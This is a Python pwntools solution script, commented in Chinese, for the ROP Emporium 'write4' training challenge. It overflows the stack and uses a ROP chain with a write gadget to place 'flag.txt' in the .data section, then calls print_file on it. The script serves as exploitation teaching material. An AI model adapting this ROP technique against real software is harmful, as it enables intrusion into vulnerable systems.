#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ROP Emporium "write4" —— 把一个字符串写进可写段，再把它当参数传给 print_file

题目：64 位 ELF（No PIE / NX / 无 canary / Partial RELRO / not stripped）。
      真正的 `pwnme` / `print_file` 在配套的 `libwrite4.so` 里（RUNPATH = b'.'）。

与 30 ret2csu 的区别（这也是它单独成类的理由）：
  * ret2csu 解决的是"**没有 pop rdx**，怎么给第三个参数传值"；
  * write4 解决的是"**没有现成的 'flag.txt' 字符串**，怎么自己造一个"——
    需要"任意地址写"原语（`mov qword ptr [r14], r15 ; ret`），
    这类 gadget 在 pwntools 的 `ROP().find_gadget` 里不一定能自动搜到
    （它藏在 `usefulGadgets` 里，前后没有标准 ret 序列），必须手读反汇编。

gadget（`objdump -d -M intel write4`）：

| 地址 | gadget |
| --- | --- |
| `0x400690` | `pop r14 ; pop r15 ; ret` |
| `0x400628` | `mov qword ptr [r14], r15 ; ret`（`usefulGadgets` 的第 1 条） |
| `0x400693` | `pop rdi ; ret` |
| `0x400510` | `print_file@plt`（参数是**文件名字符串的地址**） |

写到哪里：`.data` = `0x601028`（16 字节，初值全 0）+ `.bss` = `0x601038`（8 字节）
连成 24 字节可写区。把 `"flag.txt"`（恰好 8 字节）写到 `0x601028`，
紧跟的 `0x601030` 本来就是 0，天然是字符串终止符——**不要写到 `0x601038`**，
那样 `0x601040` 就是 heap 起点（brk），`fopen` 内部 malloc 会踩到我们写的字节。
"""

import os
import resource
import sys

from pwn import *  # noqa: F401,F403

context(os="linux", arch="amd64", log_level="info")

# 链跑完时目标进程的栈已被破坏，退出会 SIGSEGV；关掉 core，别在题目录里留 core.*
resource.setrlimit(resource.RLIMIT_CORE, (0, 0))

os.chdir(os.path.dirname(os.path.abspath(__file__)))
BIN = "./write4"

HOST = os.getenv("HOST", "")          # 官方无公开远程：默认只跑本地
PORT = int(os.getenv("PORT", "0"))

# ---- gadget ----
POP_R14_R15 = 0x400690      # pop r14 ; pop r15 ; ret
MOV_R14_R15 = 0x400628      # mov qword ptr [r14], r15 ; ret
POP_RDI     = 0x400693      # pop rdi ; ret
PRINT_FILE  = 0x400510      # print_file@plt

# ---- 可写目标 / 参数 ----
DATA   = 0x601028          # .data 起点（8 字节 "flag.txt" + 8 字节 0 终止符）
FILENAME = b"flag.txt"     # print_file 打开的相对路径（EXP 已 chdir 到脚本目录）
OFFSET = 0x28               # pwnme: sub rsp,0x20 -> saved rbp 在 +0x20，RIP 在 +0x28


def start() -> tube:
    if args.LOCAL or not HOST:
        return process(BIN)
    return remote(HOST, PORT)


def build() -> bytes:
    """read(0, rbp-0x20, 0x200) 一次写入完整链。"""
    return flat(
        b"A" * OFFSET,
        POP_R14_R15, DATA, FILENAME,   # r14 = 目标地址，r15 = 字符串
        MOV_R14_R15,                   # *(u64*)0x601028 = "flag.txt"
        POP_RDI, DATA,                 # rdi = 字符串地址
        PRINT_FILE,                    # print_file("flag.txt")
    )


def main() -> int:
    payload = build()
    assert len(payload) < 0x200, "read 上限 0x200"
    p = start()
    p.recvuntil(b"> ")
    p.send(payload)
    out = p.recvrepeat(3)
    p.close()

    text = out.decode("utf-8", "ignore")
    print(text)
    ok = "ROPE" in text or "FLAG" in text
    if ok:
        log.success("got flag line above")
    else:
        log.failure("no flag, check gadgets/offset")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
